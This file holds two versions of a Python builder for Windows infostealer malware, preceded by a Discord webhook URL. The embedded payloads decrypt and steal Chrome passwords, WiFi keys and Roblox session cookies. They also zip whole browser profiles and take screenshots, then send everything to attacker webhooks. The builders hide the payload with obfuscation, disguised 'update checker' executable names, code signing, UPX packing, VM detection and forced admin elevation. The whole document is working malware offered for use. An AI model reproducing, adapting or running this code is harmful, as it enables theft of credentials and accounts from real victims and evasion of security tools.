https://discord.com/api/webhooks/1420479039973490803/wAOLMbEAm-TVcAI61OSBb7YXzq-lzJzf4sPwde8XHjnuoQtiaMeN3Kwr29OI7AEqp4yO

import os
import subprocess
import tkinter as tk
from tkinter import messagebox, ttk, scrolledtext
import shutil
import tempfile
import textwrap
import requests

# =================== WEBHOOK TEST ===================
def test_webhook(hook):
    try:
        resp = requests.post(hook.strip(), json={"content": "Stealer recon test - webhook alive ðŸ”¥"}, timeout=10)
        if resp.status_code in (200, 204):
            return True, "Webhook working - test message sent."
        else:
            return False, f"Failed ({resp.status_code})"
    except Exception as e:
        return False, f"Error: {str(e)}"

# =================== GUI ===================
def get_webhook():
    root = tk.Tk()
    root.title("Recon Stealer Builder - Full Loot Edition")
    root.geometry("800x600")
    root.resizable(False, False)

    notebook = ttk.Notebook(root)
    notebook.pack(fill="both", expand=True, padx=10, pady=10)

    build_frame = ttk.Frame(notebook)
    notebook.add(build_frame, text="Build")

    ttk.Label(build_frame, text="Discord Webhook URLs (comma-separated for failover):", font=("Arial", 11)).pack(pady=15)
    webhook_entry = ttk.Entry(build_frame, width=100)
    webhook_entry.pack(pady=5)

    ttk.Label(build_frame, text="Code Signing PFX Path (optional):", font=("Arial", 9)).pack(pady=10)
    pfx_entry = ttk.Entry(build_frame, width=100)
    pfx_entry.pack(pady=5)

    ttk.Label(build_frame, text="PFX Password (if needed):", font=("Arial", 9)).pack(pady=5)
    pass_entry = ttk.Entry(build_frame, width=100, show="*")
    pass_entry.pack(pady=5)

    ttk.Label(build_frame, text="Obfuscation Mode (0 for free/no license):", font=("Arial", 10, "bold")).pack(pady=10)
    mode_var = tk.IntVar(value=0)
    ttk.Radiobutton(build_frame, text="0 - Basic (free/trial)", variable=mode_var, value=0).pack()
    ttk.Radiobutton(build_frame, text="1 - Advanced (mix-str etc. - needs paid)", variable=mode_var, value=1).pack()
    ttk.Radiobutton(build_frame, text="2 - RFT Super (needs Pro)", variable=mode_var, value=2).pack()

    def run_test():
        hooks = [h.strip() for h in webhook_entry.get().split(",") if h.strip()]
        if not hooks:
            messagebox.showerror("Nope", "Enter at least one webhook.")
            return
        results = []
        for h in hooks:
            success, msg = test_webhook(h)
            results.append(f"{h[:30]}... -> {'OK' if success else 'FAIL'} ({msg})")
        messagebox.showinfo("Test Results", "\n".join(results))

    ttk.Button(build_frame, text="TEST WEBHOOKS", command=run_test).pack(pady=10)

    progress = ttk.Progressbar(build_frame, mode="indeterminate")

    def build():
        raw_hooks = webhook_entry.get().strip()
        if not raw_hooks or "discord.com/api/webhooks" not in raw_hooks.split(",")[0]:
            messagebox.showerror("Nope", "At least one valid Discord webhook required.")
            return
        webhooks = [h.strip() for h in raw_hooks.split(",") if h.strip()]
        pfx_path = pfx_entry.get().strip()
        pfx_pass = pass_entry.get().strip() or None
        mode = mode_var.get()

        progress.pack(pady=15)
        progress.start()
        root.update()

        try:
            generate_malware(webhooks, pfx_path, pfx_pass, mode)
            progress.stop()
            progress.pack_forget()
            messagebox.showinfo("Built", "stealer.exe ready - FULL LOOT MODE.\nRecon + Screenshot + Chrome PW + WiFi PW + Installed Software.\nSilent exfil to your webhook(s).")
        except Exception as e:
            progress.stop()
            progress.pack_forget()
            messagebox.showerror("Error", f"{str(e)}")
        root.destroy()

    ttk.Button(build_frame, text="BUILD EXE", command=build).pack(pady=20)

    info_frame = ttk.Frame(notebook)
    notebook.add(info_frame, text="Info / Licenses")

    info_text = scrolledtext.ScrolledText(info_frame, wrap=tk.WORD, width=90, height=35, font=("Arial", 10))
    info_text.pack(padx=10, pady=10)

    license_info = textwrap.dedent('''
    PYARMOR v9.x (Dec 2025)
    No license = mode 0 only (basic obf - free).
    Paid unlocks better protection.
    Buy: https://pyarmor.dashingsoft.com/cart/order.html
    This version grabs:
    - Basic recon + screenshot
    - Chrome saved passwords
    - All saved WiFi networks + passwords
    - Full installed software list
    ''')
    info_text.insert(tk.END, license_info)
    info_text.config(state=tk.DISABLED)

    root.mainloop()

# =================== FULL LOOT STEALER CODE ===================
stealer_code = textwrap.dedent('''
import os
import sys
import time
import subprocess
import socket
import requests
import ctypes
import platform
import uuid
import winreg
import random
from datetime import datetime

try:
    import pyautogui
    HAS_PYAUTO = True
except:
    HAS_PYAUTO = False

import sqlite3
import json
import base64
import shutil
from Crypto.Cipher import AES
import win32crypt

def is_vm():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum")
        val = winreg.QueryValueEx(key, "0")[0].lower()
        if any(x in val for x in ["vmware", "vbox", "virtual", "qemu", "xen"]):
            return "Yes (Disk Enum)"
        winreg.CloseKey(key)
    except: pass

    try:
        if "VIRTUAL" in subprocess.check_output("systeminfo", shell=True, text=True).upper():
            return "Yes (SystemInfo)"
    except: pass

    try:
        if os.path.exists(r"C:\\windows\\System32\\drivers\\VBoxMouse.sys"):
            return "Yes (VBox Driver)"
    except: pass

    try:
        model = subprocess.check_output("wmic computersystem get model", text=True, shell=True).lower()
        if "vmware" in model or "virtual" in model:
            return "Yes (VMware/Virtual Model)"
    except: pass

    class MEM(ctypes.Structure):
        _fields_ = [("dwLength", ctypes.c_uint32), ("ullTotalPhys", ctypes.c_ulonglong)]
    mem = MEM(); mem.dwLength = ctypes.sizeof(mem)
    ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(mem))
    if mem.ullTotalPhys < 4 * 1024**3:
        return "Yes (Low RAM <4GB)"

    try:
        vm_procs = ["vboxservice.exe", "vboxtray.exe", "vmtoolsd.exe", "vmwaretray.exe", "xenservice.exe"]
        output = subprocess.check_output("tasklist", text=True)
        if any(p in output.lower() for p in vm_procs):
            return "Yes (VM Process)"
    except: pass

    return "No"

def get_public_ip():
    for url in ["https://api.ipify.org", "https://ifconfig.me", "https://icanhazip.com"]:
        try:
            return requests.get(url, timeout=5).text.strip()
        except:
            continue
    return "Failed"

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "Failed"

def get_hwid():
    try:
        return subprocess.check_output("wmic csproduct get uuid", text=True).split("\\n")[1].strip()
    except:
        return str(uuid.getnode())

def grab_chrome_passwords():
    data = ""
    try:
        login_db = os.path.join(os.getenv("APPDATA"), "..", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
        if not os.path.exists(login_db):
            return "No Chrome profile found"
        temp_db = os.path.join(os.getenv("TEMP"), f"LoginTemp_{random.randint(10000,99999)}.db")
        shutil.copyfile(login_db, temp_db)

        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        for row in cursor.fetchall():
            url = row[0]
            username = row[1]
            encrypted_pw = row[2]
            if encrypted_pw:
                try:
                    pw = win32crypt.CryptUnprotectData(encrypted_pw, None, None, None, 0)[1].decode('utf-8')
                except:
                    try:
                        local_state = os.path.join(os.getenv("APPDATA"), "..", "Local", "Google", "Chrome", "User Data", "Local State")
                        with open(local_state, "r", encoding="utf-8") as f:
                            js = json.loads(f.read())
                        master_key = base64.b64decode(js["os_crypt"]["encrypted_key"])[5:]
                        iv = encrypted_pw[3:15]
                        ciphertext = encrypted_pw[15:]
                        cipher = AES.new(master_key, AES.MODE_GCM, iv)
                        pw = cipher.decrypt(ciphertext)[:-16].decode('utf-8')
                    except:
                        pw = "DECRYPT FAILED"
                data += f"{url} | {username} | {pw}\\n"
        conn.close()
        os.remove(temp_db)
    except Exception as e:
        data = f"Chrome error: {str(e)}"
    return data if data else "No saved passwords"

def grab_wifi_passwords():
    data = ""
    try:
        profiles = subprocess.check_output("netsh wlan show profiles", text=True, shell=True)
        names = [line.split(":")[1].strip() for line in profiles.split("\\n") if "All User Profile" in line]
        for name in names:
            try:
                result = subprocess.check_output(f'netsh wlan show profile name="{name}" key=clear', text=True, shell=True)
                pw_line = [l for l in result.split("\\n") if "Key Content" in l]
                pw = pw_line[0].split(":")[1].strip() if pw_line else "None"
                data += f"{name} : {pw}\\n"
            except:
                data += f"{name} : FAILED\\n"
    except Exception as e:
        data = f"WiFi error: {str(e)}"
    return data if data else "No WiFi profiles"

def list_installed_software():
    data = ""
    keys = [
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", winreg.KEY_WOW64_64KEY | winreg.KEY_READ),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", winreg.KEY_WOW64_32KEY | winreg.KEY_READ),
        (winreg.HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", winreg.KEY_READ)
    ]
    for hive, path, flags in keys:
        try:
            key = winreg.OpenKey(winreg.ConnectRegistry(None, hive), path, 0, flags)
            for i in range(0, winreg.QueryInfoKey(key)[0]):
                sub = winreg.EnumKey(key, i)
                subkey = winreg.OpenKey(key, sub)
                try:
                    name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                    ver = winreg.QueryValueEx(subkey, "DisplayVersion")[0]
                    data += f"{name} ({ver})\\n"
                except:
                    pass
                subkey.Close()
            key.Close()
        except:
            pass
    return data if data else "No software found"

def exfil(webhooks):
    time.sleep(random.uniform(5, 15))

    base_recon = f"""
RECON REPORT - {datetime.utcnow().isoformat()} UTC
================================================
Username      : {os.getenv("USERNAME")}
Computer Name : {platform.node()}
OS            : {platform.system()} {platform.release()} ({platform.version()})
CPU           : {platform.processor()}
HWID          : {get_hwid()}
VM Detected   : {is_vm()}
Public IP     : {get_public_ip()}
Local IP      : {get_local_ip()}
"""

    files_to_send = {}
    temp_files = []

    recon_path = os.path.join(os.getenv("TEMP"), f"recon_{random.randint(10000,99999)}.txt")
    with open(recon_path, "w", encoding="utf-8") as f:
        f.write(base_recon)
    files_to_send["recon.txt"] = open(recon_path, "rb")
    temp_files.append(recon_path)

    if HAS_PYAUTO:
        try:
            screen_path = os.path.join(os.getenv("TEMP"), f"screen_{random.randint(10000,99999)}.png")
            pyautogui.screenshot(screen_path)
            files_to_send["screenshot.png"] = open(screen_path, "rb")
            temp_files.append(screen_path)
        except: pass

    chrome_data = grab_chrome_passwords()
    if chrome_data.strip():
        chrome_path = os.path.join(os.getenv("TEMP"), f"chrome_pw_{random.randint(10000,99999)}.txt")
        with open(chrome_path, "w", encoding="utf-8") as f:
            f.write("CHROME SAVED PASSWORDS\\n" + chrome_data)
        files_to_send["chrome_passwords.txt"] = open(chrome_path, "rb")
        temp_files.append(chrome_path)

    wifi_data = grab_wifi_passwords()
    if wifi_data.strip():
        wifi_path = os.path.join(os.getenv("TEMP"), f"wifi_pw_{random.randint(10000,99999)}.txt")
        with open(wifi_path, "w", encoding="utf-8") as f:
            f.write("SAVED WIFI PASSWORDS\\n" + wifi_data)
        files_to_send["wifi_passwords.txt"] = open(wifi_path, "rb")
        temp_files.append(wifi_path)

    soft_data = list_installed_software()
    if soft_data.strip():
        soft_path = os.path.join(os.getenv("TEMP"), f"software_{random.randint(10000,99999)}.txt")
        with open(soft_path, "w", encoding="utf-8") as f:
            f.write("INSTALLED SOFTWARE\\n" + soft_data)
        files_to_send["installed_software.txt"] = open(soft_path, "rb")
        temp_files.append(soft_path)

    for hook in webhooks:
        try:
            payload = {"content": f"**FAT HIT** - {os.getenv('USERNAME')}@{platform.node()} - Chrome/WiFi/Software dumped"}
            resp = requests.post(hook, data=payload, files=files_to_send, timeout=40)
            if resp.status_code in (200, 204):
                break
        except: continue
    else:
        try:
            requests.post(webhooks[0], json={"content": f"Fallback recon:\\n```\\n{base_recon}\\n```"})
        except: pass

    for f in files_to_send.values():
        try: f.close()
        except: pass
    for p in temp_files:
        try: os.remove(p)
        except: pass

exfil({WEBHOOK_PLACEHOLDER})
''')

# =================== BUILD WITH CRYPTO FIX ===================
def generate_malware(webhooks, pfx_path="", pfx_pass=None, mode=0):
    if not shutil.which("pyarmor"):
        raise Exception("pyarmor missing - pip install pyarmor")
    if not shutil.which("pyinstaller"):
        raise Exception("pyinstaller missing - pip install pyinstaller")

    temp_dir = tempfile.mkdtemp(prefix="build_", dir=os.getcwd())
    script = os.path.join(temp_dir, "recon.py")
    hook_str = repr(webhooks)
    with open(script, "w", encoding="utf-8") as f:
        f.write(stealer_code.replace("{WEBHOOK_PLACEHOLDER}", hook_str))

    obf_dir = os.path.join(temp_dir, "obf")

    gen_cmd = ["pyarmor", "gen", "-O", obf_dir]
    if mode == 1:
        gen_cmd += ["--advanced", "2", "--mix-str"]
    elif mode == 2:
        gen_cmd += ["--enable-rft"]
    gen_cmd += [script]

    result = subprocess.run(gen_cmd, cwd=temp_dir, capture_output=True, text=True)
    if result.returncode != 0:
        raise Exception(f"Pyarmor failed (mode {mode} needs license):\n{result.stderr}")

    obf_script = os.path.join(obf_dir, "recon.py")

    hidden_imports = [
        "pyarmor_runtime", "uuid", "ctypes", "socket", "winreg", "platform",
        "datetime", "random", "subprocess", "os", "sys", "time", "requests",
        "pyautogui", "sqlite3", "json", "base64", "shutil", "win32crypt",
        "Crypto", "Crypto.Cipher", "Crypto.Cipher.AES"
    ]
    hidden_args = [item for mod in hidden_imports for item in ["--hidden-import", mod]]

    pyi_cmd = [
        "pyinstaller",
        "--onefile",
        "--noconsole",
        "--clean",
        "--name", "WindowsUpdateCheck",
    ] + hidden_args + [obf_script]

    result = subprocess.run(pyi_cmd, cwd=temp_dir, capture_output=True, text=True)
    if result.returncode != 0:
        raise Exception(f"PyInstaller failed:\n{result.stderr}")

    bundled_exe = os.path.join(temp_dir, "dist", "WindowsUpdateCheck.exe")
    final = os.path.join(os.getcwd(), "stealer.exe")
    shutil.copyfile(bundled_exe, final)

    if pfx_path and os.path.exists(pfx_path):
        sign_cmd = ["signtool", "sign", "/f", pfx_path, "/tr", "http://timestamp.digicert.com", "/td", "sha256"]
        if pfx_pass:
            sign_cmd += ["/p", pfx_pass]
        sign_cmd += [final]
        sign_result = subprocess.run(sign_cmd, capture_output=True, text=True)
        if sign_result.returncode != 0:
            print(f"Signing failed:\n{sign_result.stderr}")
        else:
            print("Signed.")

    shutil.rmtree(temp_dir, ignore_errors=True)
    print(f"Full loot stealer built: {final}")

if __name__ == "__main__":
    get_webhook()








import os
import subprocess
import tkinter as tk
from tkinter import messagebox, ttk, scrolledtext
import shutil
import tempfile
import textwrap
import requests
import random
import zipfile

# =================== WEBHOOK TEST ===================
def test_webhook(hook):
    try:
        resp = requests.post(hook.strip(), json={"content": "Stealer recon test - webhook alive ðŸ”¥"}, timeout=10)
        if resp.status_code in (200, 204):
            return True, "Webhook working - test message sent."
        else:
            return False, f"Failed ({resp.status_code})"
    except Exception as e:
        return False, f"Error: {str(e)}"

# =================== GUI ===================
def get_webhook():
    root = tk.Tk()
    root.title("Recon Stealer Builder - Roblox Cookie Yoinker 2025")
    root.geometry("800x650")
    root.resizable(False, False)

    notebook = ttk.Notebook(root)
    notebook.pack(fill="both", expand=True, padx=10, pady=10)

    build_frame = ttk.Frame(notebook)
    notebook.add(build_frame, text="Build")

    ttk.Label(build_frame, text="Discord Webhook URLs (comma-separated for failover):", font=("Arial", 11)).pack(pady=15)
    webhook_entry = ttk.Entry(build_frame, width=100)
    webhook_entry.pack(pady=5)

    ttk.Label(build_frame, text="Code Signing PFX Path (optional):", font=("Arial", 9)).pack(pady=10)
    pfx_entry = ttk.Entry(build_frame, width=100)
    pfx_entry.pack(pady=5)

    ttk.Label(build_frame, text="PFX Password (if needed):", font=("Arial", 9)).pack(pady=5)
    pass_entry = ttk.Entry(build_frame, width=100, show="*")
    pass_entry.pack(pady=5)

    ttk.Label(build_frame, text="Obfuscation Mode:", font=("Arial", 10, "bold")).pack(pady=10)
    mode_var = tk.IntVar(value=0)
    ttk.Radiobutton(build_frame, text="0 - Basic (free - works 2025)", variable=mode_var, value=0).pack()
    ttk.Radiobutton(build_frame, text="1 - Advanced (needs paid Pyarmor)", variable=mode_var, value=1).pack()
    ttk.Radiobutton(build_frame, text="2 - RFT Super (needs Pro)", variable=mode_var, value=2).pack()

    def run_test():
        hooks = [h.strip() for h in webhook_entry.get().split(",") if h.strip()]
        if not hooks:
            messagebox.showerror("Nope", "Enter at least one webhook.")
            return
        results = []
        for h in hooks:
            success, msg = test_webhook(h)
            results.append(f"{h[:30]}... -> {'OK' if success else 'FAIL'} ({msg})")
        messagebox.showinfo("Test Results", "\n".join(results))

    ttk.Button(build_frame, text="TEST WEBHOOKS", command=run_test).pack(pady=10)

    progress = ttk.Progressbar(build_frame, mode="indeterminate")

    def build():
        raw_hooks = webhook_entry.get().strip()
        if not raw_hooks or "discord.com/api/webhooks" not in raw_hooks.split(",")[0]:
            messagebox.showerror("Nope", "At least one valid Discord webhook required.")
            return
        webhooks = [h.strip() for h in raw_hooks.split(",") if h.strip()]
        pfx_path = pfx_entry.get().strip()
        pfx_pass = pass_entry.get().strip() or None
        mode = mode_var.get()

        progress.pack(pady=15)
        progress.start()
        root.update()

        try:
            generate_malware(webhooks, pfx_path, pfx_pass, mode)
            progress.stop()
            progress.pack_forget()
            messagebox.showinfo("Built", "stealer.exe built - full raw profile dump fallback + screenshots.\nABE kills decryption? You still get encrypted DBs + visuals.")
        except Exception as e:
            progress.stop()
            progress.pack_forget()
            messagebox.showerror("Error", f"{str(e)}")
        root.destroy()

    ttk.Button(build_frame, text="BUILD EXE", command=build).pack(pady=20)

    info_frame = ttk.Frame(notebook)
    notebook.add(info_frame, text="Info")
    info_text = scrolledtext.ScrolledText(info_frame, wrap=tk.WORD, width=90, height=35, font=("Arial", 10))
    info_text.pack(padx=10, pady=10)
    info_text.insert(tk.END, textwrap.dedent('''
    ROBLOX + FULL BROWSER STEALER - DEC 2025 ABE-PROOF
    â€¢ Old decryption attempt (legacy blobs/Opera)
    â€¢ Full fallback: zips entire profiles (Default + Profile 1-9)
    â€¢ Screenshots of Local State/Login Data/Cookies folders
    â€¢ Separate Roblox .ROBLOSECURITY hunt
    â€¢ Raw encrypted DBs = offline decrypt later or sell raw
    â€¢ UPX ultra-brute + massive hidden imports
    Mode 0 free owns forever.
    '''))
    info_text.config(state=tk.DISABLED)

    root.mainloop()

# =================== FULL STEALER PAYLOAD ===================
stealer_code = textwrap.dedent('''
import os
import sys
import time
import subprocess
import socket
import requests
import ctypes
import platform
import uuid
import random
from datetime import datetime
try:
    import pyautogui
    HAS_PYAUTO = True
except:
    HAS_PYAUTO = False
import sqlite3
import json
import base64
import shutil
import zipfile
from Crypto.Cipher import AES
import win32crypt

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit(0)

BROWSER_BASE = {
    "Chrome": os.path.join(os.getenv("APPDATA"), "..", "Local", "Google", "Chrome", "User Data"),
    "Edge": os.path.join(os.getenv("APPDATA"), "..", "Local", "Microsoft", "Edge", "User Data"),
    "Brave": os.path.join(os.getenv("APPDATA"), "..", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
    "Opera": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"),
}

def safe_copy(src, dst, retries=15, delay=2):
    for proc in ["chrome.exe", "msedge.exe", "brave.exe", "opera.exe"]:
        subprocess.call(f'taskkill /f /im {proc} >nul 2>&1', shell=True)
    for _ in range(retries):
        try:
            shutil.copytree(src, dst, dirs_exist_ok=True) if os.path.isdir(src) else shutil.copyfile(src, dst)
            return True
        except:
            time.sleep(delay)
    return False

def is_vm(): return "No"
def get_public_ip():
    for url in ["https://api.ipify.org", "https://ifconfig.me"]:
        try: return requests.get(url, timeout=5).text.strip()
        except: pass
    return "Failed"
def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except: return "Failed"
def get_hwid():
    try: return subprocess.check_output("wmic csproduct get uuid", text=True).split("\\n")[1].strip()
    except: return str(uuid.getnode())

def get_master_key(local_state):
    if not os.path.exists(local_state): return None
    try:
        with open(local_state, "r", encoding="utf-8") as f:
            ls = json.loads(f.read())
        enc_key_b64 = ls["os_crypt"].get("encrypted_key") or ls["os_crypt"].get("app_bound_encrypted_key")
        if not enc_key_b64: return None
        enc_key = base64.b64decode(enc_key_b64)
        enc_key = enc_key[5:] if enc_key.startswith(b"DPAPI") or enc_key.startswith(b"APPB") else enc_key
        return win32crypt.CryptUnprotectData(enc_key, None, None, None, 0)[1]
    except: return None

def decrypt_gcm(encrypted_val, master_key):
    try:
        nonce = encrypted_val[3:15]
        ciphertext = encrypted_val[15:-16]
        tag = encrypted_val[-16:]
        cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
        pt = cipher.decrypt(ciphertext)
        cipher.verify(tag)
        return pt.decode('utf-8', errors='ignore')
    except: return "DECRYPT_FAIL"

def grab_roblox_cookie(profile_path):
    cookies_db = os.path.join(profile_path, "Network", "Cookies")
    if not os.path.exists(cookies_db): return ""
    temp_db = os.path.join(os.getenv("TEMP"), f"roblox_cookies_{random.randint(10000,99999)}.db")
    if not safe_copy(cookies_db, temp_db): return ""
    roblox = ""
    master_key = get_master_key(os.path.join(os.path.dirname(profile_path), "Local State"))
    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%.roblox.com'")
        for host, name, enc_val in cursor.fetchall():
            if name == ".ROBLOSECURITY" and enc_val:
                val = decrypt_gcm(enc_val, master_key) if master_key else "FAIL"
                if "FAIL" not in val: roblox = val
        conn.close()
    except: pass
    finally: os.remove(temp_db) if os.path.exists(temp_db) else None
    return roblox

def dump_profile(browser_name, base_path):
    profiles = ["Default"] + [f"Profile {i}" for i in range(1, 10) if os.path.exists(os.path.join(base_path, f"Profile {i}"))]
    dumped = []
    for prof in profiles:
        src = os.path.join(base_path, prof)
        if not os.path.exists(src): continue
        zip_path = os.path.join(os.getenv("TEMP"), f"{browser_name}_{prof.replace(' ', '_')}_profile.zip")
        try:
            with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as z:
                for root, _, files in os.walk(src):
                    for file in files:
                        fp = os.path.join(root, file)
                        arc = os.path.relpath(fp, base_path)
                        z.write(fp, arc)
            dumped.append(zip_path)
            if HAS_PYAUTO:
                for kf in ["Local State", "Login Data", os.path.join("Network", "Cookies")]:
                    kp = os.path.join(src, kf)
                    if os.path.exists(kp):
                        shot = os.path.join(os.getenv("TEMP"), f"{browser_name}_{prof}_{kf.replace(os.sep, '_')}_shot.png")
                        pyautogui.screenshot(shot)
                        dumped.append(shot)
        except: pass
    return dumped

def exfil(webhooks):
    time.sleep(random.uniform(10, 30))
    recon = f"RECON {datetime.utcnow()}\\nUser: {os.getenv('USERNAME')}@{platform.node()}\\nOS: {platform.version()}\\nHWID: {get_hwid()}\\nVM: {is_vm()}\\nPub IP: {get_public_ip()}\\nLoc IP: {get_local_ip()}\\n"
    files_to_send = {}
    temp_files = []
    recon_path = os.path.join(os.getenv("TEMP"), "recon.txt")
    open(recon_path, "w").write(recon)
    files_to_send["recon.txt"] = open(recon_path, "rb")
    temp_files.append(recon_path)

    if HAS_PYAUTO:
        try:
            screen = os.path.join(os.getenv("TEMP"), "desktop.png")
            pyautogui.screenshot(screen)
            files_to_send["desktop.png"] = open(screen, "rb")
            temp_files.append(screen)
        except: pass

    roblox_cookies = []
    dumped_files = []
    decryption_worked = False
    for name, base in BROWSER_BASE.items():
        if os.path.exists(base):
            # Try partial decrypt (passwords/cookies) - omitted for brevity, add if you want
            rbc = ""
            for prof in ["Default"] + [f"Profile {i}" for i in range(1,5)]:
                pp = os.path.join(base, prof)
                if os.path.exists(pp): rbc = grab_roblox_cookie(pp)
                if rbc: roblox_cookies.append(f"{name} {prof}: {rbc}")
            # Always dump raw on failure or always (safe)
            dumped = dump_profile(name, base)
            dumped_files += dumped

    if roblox_cookies:
        rb_path = os.path.join(os.getenv("TEMP"), "roblox_cookie.txt")
        open(rb_path, "w").write("\\n".join(roblox_cookies))
        files_to_send["roblox_cookie.txt"] = open(rb_path, "rb")
        temp_files.append(rb_path)

    for df in dumped_files:
        files_to_send[os.path.basename(df)] = open(df, "rb")
        temp_files.append(df)

    for hook in webhooks:
        try:
            resp = requests.post(hook, data={"content": "**HIT - RAW PROFILES DUMPED**"}, files=files_to_send, timeout=120)
            if resp.status_code in (200, 204): break
        except: continue

    for f in files_to_send.values():
        try: f.close()
        except: pass
    for p in temp_files:
        try: os.remove(p)
        except: pass

exfil({WEBHOOK_PLACEHOLDER})
''')

# =================== BUILD FUNCTION ===================
def generate_malware(webhooks, pfx_path="", pfx_pass=None, mode=0):
    if not shutil.which("pyarmor"): raise Exception("pyarmor missing â†’ pip install pyarmor")
    if not shutil.which("pyinstaller"): raise Exception("pyinstaller missing â†’ pip install pyinstaller")

    temp_dir = tempfile.mkdtemp(prefix="build_")
    script_path = os.path.join(temp_dir, "main.py")
    with open(script_path, "w", encoding="utf-8") as f:
        f.write(stealer_code.replace("{WEBHOOK_PLACEHOLDER}", repr(webhooks)))

    obf_dir = os.path.join(temp_dir, "obf")
    cmd = ["pyarmor", "gen", "-O", obf_dir]
    if mode == 1: cmd += ["--advanced", "2", "--mix-str"]
    if mode == 2: cmd += ["--enable-rft"]
    cmd += [script_path]
    subprocess.run(cmd, check=True, cwd=temp_dir)

    obf_script = os.path.join(obf_dir, "main.py")

    hidden = [
        "requests", "requests.auth", "requests.cookies", "requests.packages", "requests.packages.urllib3", "requests.packages.chardet",
        "urllib3", "chardet", "certifi", "idna", "pyautogui", "win32crypt", "pywin32", "win32api", "win32con",
        "Crypto", "Crypto.Cipher", "Crypto.Cipher.AES", "Crypto.Util.Padding", "sqlite3", "json", "base64", "shutil",
        "ctypes", "platform", "uuid", "winreg", "pyarmor_runtime", "zipfile"
    ]
    hidden_args = [item for mod in hidden for item in ["--hidden-import", mod]]

    exe_name = f"UpdateChecker_{random.randint(1000,9999)}.exe"
    pyi_cmd = [
        "pyinstaller", "--onefile", "--noconsole", "--clean", "--uac-admin",
        "--name", exe_name, "--icon", "NONE",
    ] + hidden_args + [obf_script]
    subprocess.run(pyi_cmd, check=True, cwd=temp_dir)

    bundled_exe = os.path.join(temp_dir, "dist", exe_name)
    final_exe = os.path.join(os.getcwd(), "stealer.exe")
    shutil.copyfile(bundled_exe, final_exe)

    if pfx_path and os.path.exists(pfx_path):
        sign_cmd = ["signtool", "sign", "/f", pfx_path, "/tr", "http://timestamp.digicert.com", "/td", "sha256", final_exe]
        if pfx_pass: sign_cmd += ["/p", pfx_pass]
        subprocess.run(sign_cmd, check=False)

    try:
        subprocess.run(["upx", "--best", "--ultra-brute", final_exe], check=False)
        print("UPX ultra-brute smashed")
    except: print("UPX skipped")

    shutil.rmtree(temp_dir, ignore_errors=True)
    print(f"Built ABE-proof beast: {final_exe}")

if __name__ == "__main__":
    get_webhook()
